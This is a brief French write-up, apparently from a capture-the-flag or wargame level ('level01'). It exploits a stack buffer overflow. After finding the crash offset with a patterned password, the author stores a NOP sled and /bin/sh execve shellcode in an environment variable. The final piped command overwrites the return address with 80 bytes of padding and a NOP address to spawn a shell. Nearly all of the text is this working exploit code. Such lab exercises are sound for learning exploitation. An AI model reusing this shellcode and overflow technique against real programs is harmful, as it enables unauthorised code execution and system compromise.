- on remarque un segfault aux UUUU quand password = AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
- on peut donc ecrire l'adresse que l'on veut a cet endroit, elle sera executee
- on choisit d'ouvrir un shell enregistre en variable d'environnement


export SHELLCODE2=$(python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')

adresse de SHELLCODE2 : 0xffffdea7
une adresse d'un NOP  : 0xffffdec7

(python -c 'print "dat_will"'; python -c 'import struct; print "A"*80 + struct.pack("I", 0xffffdec7)'; cat) | ./level01